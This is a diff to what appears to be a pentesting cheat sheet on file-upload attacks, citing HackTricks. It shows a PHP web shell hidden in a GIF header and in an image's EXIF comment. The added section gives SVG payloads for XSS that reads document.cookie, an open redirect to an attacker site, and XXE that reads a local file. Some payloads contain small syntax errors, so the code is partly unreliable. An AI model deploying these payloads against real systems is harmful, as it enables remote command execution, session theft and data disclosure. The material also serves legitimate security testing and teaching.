@@ -148,7 +148,46 @@ GIF89a; <?php system($_GET['cmd']); ?>
   ```
   exiftool -Comment="<?php system($_GET['cmd']); ?>" pic.jpg
   ```
+
+## Exploit
+   - XSS
+      
+      Upload using .svg file
+      
+      Set file name `<svg onload=alert(document.cookie)>`
+        ```svg
+        <?xml version="1.0" standalone="no"?>
+        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+        <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+	        <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke;rgb(0,0,0)" />
+	        <script type"text/javascript">
+	        	alert("poc");
+	        </script>
+        </svg>
+        ```
+  - Open Redirect
+    
+     Upload using .svg file
+     ```svg
+      <code>
+     <?xml version="1.0" encoding="UTF-8" standalone"yes"?>
+     <svg onload="window.location='https://attacker-website.com'" xmlns="http://www.w3.org/2000/svg">
+	   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke;rgb(0,0,0)" />
+     </svg>
+       </code>
+     ```
+  - XXE
   
+      Upload using .svg file
+  ```svg
+  <?xml version="1.0" standalone"yes"?>
+  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file://etc/hostname" > ]>
+  <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+  	<text font-size="40" x="0" y="16">&xxe;</text>
+  </svg>
+  ```
+
 ## Reference
   
 - https://book.hacktricks.xyz/pentesting-web/file-upload#wget-file-upload-ssrf-trick
